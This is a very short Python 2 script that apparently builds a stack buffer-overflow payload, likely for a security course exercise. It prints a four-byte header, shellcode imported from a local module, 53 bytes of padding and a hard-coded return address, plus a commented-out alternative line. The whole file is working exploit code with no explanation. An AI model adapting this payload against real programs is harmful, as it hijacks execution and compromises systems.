from shellcode import shellcode 

print '\x01\x00\x00\x40' + shellcode + 53*'\x61' + '\x80\x7e\xfe\xbf'




#print '\x00\x00\x00\x01' + '\x61'
